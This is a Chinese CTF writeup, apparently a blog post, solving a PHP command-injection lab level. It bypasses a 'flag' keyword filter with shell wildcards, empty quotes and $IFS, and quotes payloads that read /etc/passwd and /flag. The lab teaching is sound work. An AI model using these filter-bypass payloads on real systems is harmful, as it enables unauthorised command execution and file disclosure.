---
title: RCE-labs Level5 wp
published: 2026-10-07
pinned: false
description: 终端特性：空字符忽略与通配符
tags: [ctf,web]
category: node
draft: false
---


# HelloCTF RCE-labs · 终端特性：空字符忽略与通配符 —— Writeup

| 项目 | 内容 |
|---|---|
| 靶场 | HelloCTF RCE 靶场（`github.com/ProbiusOfficial/RCE-labs`，作者 探姬） |
| 关卡 | 命令执行 —— 终端特性_空字符忽略和通配符 |
| 题型 | Web / PHP 命令执行（Command Injection / RCE） |
| 目标 | `http://80-17a943e8-7ab8-4a5b-9bd1-e921c60d4a73.challenge.ctfplus.cn/` |
| 入口参数 | GET 参数 `cmd` |
| 过滤情况 | `preg_match("/flag/", $cmd)` —— 单一关键词黑名单，**大小写敏感** |
| 工具 | 新版 HackBar（DevTools 内置版）、Burp Suite Community v2026.8（新版 UI） |
| 结果 | 拿到 `Geesec{82c3c71d-2897-42c2-926f-7118f7b0964c}` |

> 注：上方地址是平台下发的临时实例，题目做完后会失效。复现时请替换成自己那一份。

---

## 一、题目

打开靶机，页面直接把自己的源码打印了出来（`highlight_file(__FILE__)` 的效果）。去掉大段教学注释后，真正有意义的就这几行：

```php
function hello_shell($cmd){
    if(preg_match("/flag/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);
```

题面注释里出题人已经把答案摆出来了，三条示范 payload：

```
system("c''at /e't'c/pass?d");
system("/???/?at /e't'c/pass?d");
system("/???/?at /e't'c/*ss*");
```

同时给出了一整套 Shell 终端特性速查：

| 符号 | 含义 | 例子 |
|---|---|---|
| `''` / `""` | 定义空字符串，Shell 会忽略它 | `echo "$"a` 输出 `$a` |
| `*` | 匹配零个或多个字符 | `*.txt` |
| `?` | 匹配单个字符 | `file?.txt` |
| `[]` | 匹配方括号内任意一个字符 | `file[1-3].txt` |
| `[^]` | 匹配不在方括号内的字符 | `file[^a-c].txt` |
| `{}` | 匹配大括号内任意一个字符串 | `file{1,2,3}.txt` |

---

## 二、题目分析

### 2.1 从页面读出的三条线索

| 线索（页面原文） | 出现位置 | 推出的结论 |
|---|---|---|
| `isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;` | 源码 | 参数名叫 `cmd`，走 **GET 查询串**传入 |
| `system($cmd);` | 源码 | 值被**原样交给系统 shell 执行**，结果直接回显 |
| `if(preg_match("/flag/", $cmd)) die("WAF!");` | 源码 | 唯一过滤 = 拦截字符串 `flag` |

### 2.2 三个关键判断

**判断一：不需要任何命令分隔符。**

参数 `cmd` 的值本身就是**完整命令**，不存在 `ping -c 3 <input>` 那种"前后拼接"的结构。所以 `;`、`|`、`&&`、`%0a`、`${IFS}` 这一整套**分隔符手艺全部用不上** —— 别绕远路。

**判断二：`$_GET` 读的是「位置」，不是「方法」。**

PHP 的 `$_GET` 名字有误导性：它读的是 **URL 查询串**，跟 HTTP 方法无关。所以：

- 改成 POST 并把 `cmd` 塞进 **body** → `isset($_GET['cmd'])` 为 `false` → 走 `null` 分支 → **靶机什么都不执行**
- 改成 POST 但把 `cmd` 留在 **query string**（`POST /?cmd=...`）→ **照样能通**

实测验证：

| 请求 | 结果 |
|---|---|
| `GET /?cmd=ls%20/` | 200，正常回显命令输出 |
| `POST /` + body `cmd=ls%20/` | 200，**只回显源码，无命令输出** |
| `POST /?cmd=ls%20/` + 空 body | 200，**正常回显命令输出** |

> 结论：换方法 ≠ 换参数位置。改 POST 的唯一价值是赌 WAF 的检测盲区（有的只检 query、有的只检 body），**不是**用来绕 PHP 变量名的。

**判断三：WAF 只看字面文本，shell 才看文件系统。**

`preg_match("/flag/", $cmd)` 是**纯字符串匹配** —— 它不知道文件系统里有个叫 `flag` 的文件，它只检查你发来的那串字符里有没有 `f-l-a-g` 连续四个字母。

而 shell 在真正执行前会做**通配符展开（globbing）**：`/fla?` 会被展开成 `/flag`。

**这两层之间存在信息差 —— 这就是本题的全部破绽。**

### 2.3 利用思路

```
让 "flag" 这四个字母在我的输入里彻底消失，
但 shell 展开后仍然指向 /flag 这个文件
```

绕法按代价从低到高：

| 写法 | 输入里有 `flag` 吗 | shell 展开成 | 备注 |
|---|---|---|---|
| `/fl*` | 没有 | `/flag` | 最宽松，但可能误匹配同前缀文件 |
| `/fla?` | 没有（第 4 位是 `?`） | `/flag` | **最精确**，恰好 1 字符 |
| `/fla[g]` | 没有 | `/flag` | 方括号匹配 |
| `/fl''ag` | 没有（被空引号断开） | `/flag` | 题面第一行教的 |
| `/FLAG` | 没有（大写） | ❌ 文件不存在 | **伪解，见 4.3** |

---

## 三、解题过程

### 3.1 环境准备

- 浏览器：Chrome / Edge
- 工具任选其一即可：
  - **HackBar**（浏览器 DevTools 内置版）
  - **Burp Suite Community Edition v2026.8**（新版 UI）
- 本关是 `http://` 明文请求，**不需要配置任何代理，也不需要安装 CA 证书**。

### 3.2 主流程：Burp Suite（v2026.8 新版 UI）

#### 步骤 0：启动

弹出窗口选 **Temporary project** → **Use Burp defaults** → **Start Burp**。

#### 步骤 1：确认代理 + 开内置浏览器

| 步 | 操作 | 位置 |
|---|---|---|
| 1 | 确认代理监听 `127.0.0.1:8080` | `Proxy → Proxy settings → Proxy listeners`（默认已开） |
| 2 | 开内置浏览器（免配代理、免装证书） | `Proxy → Intercept` 页右上角 **Open browser** |

> 顺手确认 `Proxy → Intercept` 顶部的 **`Intercept is on / off`** 开关是 **off**。
> 它要是 on，浏览器发出的请求会卡在队列里"一直转圈"，HTTP history 里半天看不到记录。
> 本题只需反复改 payload，用 Repeater 就够，**不需要开 Intercept**。

#### 步骤 2：先探底，确认回显位置

在内置浏览器地址栏输入：

```
http://80-17a943e8-7ab8-4a5b-9bd1-e921c60d4a73.challenge.ctfplus.cn/?cmd=ls%20/
```

`ls /` 这串里**没有 `flag` 四个字母**，所以顺利过 WAF。页面**最顶部**会多出一段目录列表：

```
bin
dev
etc
flag        ← 目标文件在这里
home
lib
...
```

**注意回显在 `highlight_file` 打印的源码块之前** —— 排查时别只盯着下面那坨源码，往上翻第一屏才是结果。

#### 步骤 3：硬来一次，确认过滤是活的

地址栏改成：

```
/?cmd=cat%20/flag
```

页面返回 `WAF!`。这一步**不能省** —— 它证明过滤确实生效，且过滤的是**整串命令**（换成 `?cmd=echo%20flag` 同样被拦，说明与具体命令无关）。

#### 步骤 4：抓包送 Repeater

1. 回到 Burp → `Proxy → HTTP history` → 找到 Host 是靶机域名的那条请求
2. 选中它按 **`Ctrl+R`**（等价于右键 → **Send to Repeater**）

#### 步骤 5：在 Repeater 里改成最终 payload

切到顶部的 **Repeater** 标签，**切到 `Raw` 视图**（不要用 Pretty 编辑请求行），把第一行改为：

```http
GET /?cmd=cat%20/fla? HTTP/1.1
Host: 80-17a943e8-7ab8-4a5b-9bd1-e921c60d4a73.challenge.ctfplus.cn
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

> 原有的 `Accept` / `Accept-Encoding` / `User-Agent` 等头**保留不动**，不影响结果。
> 只有一个硬约束：**请求行里的空格必须写成 `%20`**（原因见 5.1）。

#### 步骤 6：发送并读结果

点左侧 **Send** → 右侧 Response 面板**最顶部**（在 `<code>` 源码块之前）出现：

```
Geesec{82c3c71d-2897-42c2-926f-7118f7b0964c}
```

提交该 flag，本题完成。

### 3.3 备选：HackBar 快速版

| 步骤 | 操作 |
|---|---|
| 1 | 打开靶机页面，`F12` → 点 **HackBar** 页签 |
| 2 | 点 **LOAD** 把当前 URL 填进 `URL` 框 |
| 3 | 在 `URL` 框里把地址改成 `http://靶机域名/?cmd=cat%20/fla?` |
| 4 | `Use POST method` 开关**保持关闭**（本题是 GET） |
| 5 | 点 **EXECUTE** |

其余 `SPLIT / TEST / SQLi / XSS / LFI / SSRF` 本题统统用不上，别去点。

### 3.4 两套工具对照表

| 环节 | HackBar | Burp Suite |
|---|---|---|
| 传参位置 | 直接改 `URL` 框 | 改 Raw 视图第 1 行 |
| 空格 | 手写 `%20` | 手写 `%20`（**不能敲空格**） |
| 发送按钮 | `EXECUTE` | `Send` |
| 改完要不要重发 | 点 EXECUTE 即可 | **必须重新点 Send** |
| 请求留档 | 无 | HTTP history 全程记录，可随时回看 |
| 适用性 | 单发、快速试 | 批量、需要精细控制报文时更好用 |

---

## 四、payload 推导链与实测

### 4.1 四段转换

一条 payload 从你敲下到真正执行，中间经过四次转换：

```
cmd=cat%20/fla?          ← 你在 Repeater 里敲的原文
   ↓ URL 解码：%20 → 空格
cat /fla?                ← PHP $_GET['cmd'] 拿到的是这个
   ↓ preg_match("/flag/") 检查 → 无 "flag" 子串，放行
system("cat /fla?")      ← 交给 shell
   ↓ shell 通配符展开：? = 恰好 1 个字符
cat /flag                ← 文件系统上真正执行的命令
```

**关键点：WAF 检查发生在第 2 层，通配符展开发生在第 4 层。** 中间隔了一整个 shell，这就是信息差的来源。

### 4.2 全部变体实测

| 序号 | payload | 结果 |
|---|---|---|
| 0 | `?cmd=ls%20/` | 列出根目录，看到 `flag` |
| 1 | `?cmd=cat%20/flag` | **`WAF!` 被拦** |
| 2 | `?cmd=echo%20flag` | **`WAF!` 被拦**（证明过滤与命令无关） |
| 3 | `?cmd=cat%20/fla?` | **FLAG ✓** |
| 4 | `?cmd=cat%20/fla%3F` | FLAG ✓（`?` 编码与否等效） |
| 5 | `?cmd=cat%20/fl*` | FLAG ✓ |
| 6 | `?cmd=cat%20/fla[g]` | FLAG ✓ |
| 7 | `?cmd=cat%20/fl''ag` | FLAG ✓ |
| 8 | `?cmd=cat%20/FLAG` | **无 WAF，也无输出** ← 见 4.3 |
| 9 | `?cmd=cat%20/Flag` | **无 WAF，也无输出** ← 见 4.3 |
| 10 | `?cmd=cat%20/fla?%20/fla?` | FLAG 输出两遍（通配符是服务端展开的） |

### 4.3 一个必须澄清的伪解：大写 `FLAG`

第 8、9 行看起来是"最快解法"，实际是坑：

```
/?cmd=cat%20/FLAG   →   没有 WAF!，但页面一片空白
```

原因有两层：

1. `preg_match("/flag/")` **没写 `/i` 修饰符** → 大小写敏感 → `FLAG` 确实**不被拦**；
2. **但 Linux 文件系统同样区分大小写**，`/FLAG` 这个文件**根本不存在**。

而 `system()` **只回显 stdout，stderr 不回显** —— `cat: /FLAG: No such file or directory` 这句报错被写进了 nginx error log，浏览器上看不到。

于是就出现了最坑的状态：**WAF 没拦，命令也跑了，但你看不到任何东西。**

> **判断顺序必须是：先看有没有 `WAF!` → 没有就说明过了过滤 → 再想是不是命令本身失败了。**
> 否则很容易把"文件不存在"误判成"过滤没过"，然后在错误的路上一直试。

所以：**大小写绕过只在"文件名本身大小写不敏感"时才管用**，实战中优先用通配符。

---

## 五、读不到 flag 时的排查表

| 回显现象 | 原因 | 处理 |
|---|---|---|
| 页面返回 `WAF!` | payload 里含 `flag` 子串 | 用通配符拆分：`/fla?`、`/fl*`、`/fla[g]` |
| **无 WAF，但无任何输出** | 命令跑了但失败了（文件不存在 / 命令不存在），**stderr 不回显** | 先 `ls /` 确认文件名；换 `?cmd=cat%20/fla?`；用 stdout 命令而非报错 |
| Burp 返回 `400 Bad Request` | 请求行里是**真实空格**（空格是请求行里的非法字符） | 写成 `%20`；或干脆用 `$IFS` 替代空格 |
| 改成 `%20` 后**仍然** 400 | **上一次发送的响应还挂在右边** —— Repeater 不会自动重发 | 切 **Raw / Hex** 视图确认字节，然后**重新点一次 Send** |
| 响应里没有命令输出 | 回显在页面**最顶部**，往下翻了 | 直接看响应第一屏，别盯 `<code>` 块 |
| 199 但无输出 | 用了 `%2520`（二次编码） | PHP 解出来是字面量 `cat%20/fla?`，命令变成 `cat%20/fla?` 找不到程序；改成单个 `%20` |
| 不知道文件名 | — | 先发 `?cmd=ls%20/`，让靶机自己报 |
| 想确认 flag 是否在环境变量 | — | `?cmd=env` |

### 替代空格的写法（实测均可读 flag）

| 写法 | 说明 |
|---|---|
| `cat%20/fla?` | 标准写法 |
| `cat$IFS/fla?` | `$IFS` 默认是空格/Tab/换行，展开后起空格作用 |
| `cat${IFS}/fla?` | 同上，带花括号 |
| `cat%24IFS/fla?` | 把 `$` 编码 |
| `cat%09/fla?` | Tab 字符 |

**最稳的是 `$IFS` 系列** —— URL 里一个空格都不出现，从根上避开"请求行不能有空格"这个限制。

---

## 六、原理解释

### 6.1 为什么请求行里不能有空格

HTTP 请求行的结构是：

```
<method> <SP> <request-target> <SP> <HTTP-version> CRLF
GET      /?cmd=cat /fla?       HTTP/1.1
                 ↑
            这个空格让解析器认为 target 到这里就结束了
```

多出来的空格会被当成 `<version>` 的起始，解析失败 → nginx 直接回 `400 Bad Request`。

实测：

| 请求行 | 结果 |
|---|---|
| `GET /?cmd=cat%20/fla? HTTP/1.1` | 200 |
| `GET /?cmd=cat /fla? HTTP/1.1` | **400** |
| `GET /?cmd=cat  /fla? HTTP/1.1` | **400** |

### 6.2 为什么 `?` 不用编码，而空格必须编码

这需要区分两条不同的规则：

| 字符 | 在 query string 里合法吗 | 需要编码吗 |
|---|---|---|
| 空格 | **不合法**（RFC 3986 的 `query` 不允许裸空格） | **必须** `%20` |
| `?` | **合法**（`query = *( pchar / "/" / "?" )`） | 不需要，写 `%3F` 也行 |

### 6.3 URL 编码是「两层解码」，别混层

```
cat%20/fla?   ──URL 解码──▶   cat /fla?   ──交给 shell──▶   cat /flag
   (你敲的)                    (PHP 拿到的)                  (真正执行的)
```

`%20` 在 **URL 层**就被解码成空格了，shell 看到的是**空格本身**，不是 `%20`。

---

## 七、总结：同一个字符，在不同层里身份完全不同

这是解这类题最通用的一条判断法。**遇到"某个字符能不能用"这种问题，不要死记，直接问：它是在哪一层被解释的？**

| 字符 | URL 层 | PHP 层 | shell 层 |
|---|---|---|---|
| `?` | 查询串起始符 | 普通字符 | 单字符通配符 |
| `%` | 编码引导符 | 已被解码 | 普通字符 |
| 空格 | **非法**（要写 `%20`） | 普通字符 | 参数分隔符 |
| `&` | 参数分隔符 | 普通字符 | 后台执行 |
| `;` | query 里合法 | 普通字符 | 命令分隔符 |
| `#` | 片段起始（**不发给服务器**） | — | 注释起始 |
| `$` | 普通字符 | 变量前缀 | 变量展开 |

**推论：**

- 在 **URL 层**被解释的字符 → 必须考虑编码（空格 `%20`、`#` 要 `%23`）
- 在 **shell 层**才被解释的字符 → URL 里可以原样写，让它"活着"到达 shell

而本题的 `?` 正好一个字符管两边：**第一个做语法（URL 层），第二个做数据（shell 层）**：

```
/?cmd=cat%20/fla?
│                 │
│                 └─ 第 2 个 ?  ← 数据，shell 的单字符通配符，把 /fla? 展开成 /flag
└─ 第 1 个 ?        ← URL 语法分隔符，标记查询串起点，自己不进参数值
```

**第 1 个 `?` 绝对不能编码** —— 实测 `/%3Fcmd=ls%20/` 返回 200 但 `$_GET` 全空、无任何回显，因为服务器看到的路径里没有"查询串起始符"了。

**第 2 个 `?` 编不编都行** —— 实测 `?cmd=cat%20/fla?` 和 `?cmd=cat%20/fla%3F` 结果完全一致。

验证手法：`?cmd=echo%20A?B%20C?D` → 回显 `A?B C?D`，证明第二个 `?` 原样进入了 shell。

---

## 八、要点清单（可当速查卡）

1. **先读源码再动手**：看到 `system($_GET['cmd'])` 就立刻放弃 `${IFS}`、`%0a` 那一整套分隔符手艺 —— 根本没有拼接，用不上。
2. **WAF 看字面文本，shell 看文件系统** —— 两层之间有信息差，通配符就是用来钻这个缝的。
3. **`$_GET` 读的是 URL 查询串，跟 HTTP 方法无关**。改 POST 但把参数放 body = 靶机啥也不干。
4. **请求行里不能有空格**，一律写 `%20`；想彻底避开就用 `$IFS`。
5. **`?` 在 query string 里是合法字符**，不用编码；但**第一个 `?` 是语法分隔符，绝不能编码**。
6. **`system()` 只回显 stdout，stderr 不回显**。没有 `WAF!` 却也没有输出 = 命令本身失败了，不是被拦。
7. **改完 payload 必须重新点 Send** —— Repeater 的 Response 面板不会自动刷新，这是"改了没用"的第一嫌疑。
8. **别信 Pretty 视图** —— 确认真实字节要看 `Raw`，要逐字节核对看 `Hex`。
9. **通配符优先级**：`/fla?`（最精确）> `/fla[g]` > `/fl*`（最宽松）> `/fl''ag`（空引号）。
10. **flag 找不到先 `ls /`**，让靶机自己报文件名，别猜。

---

*Writeup 完*
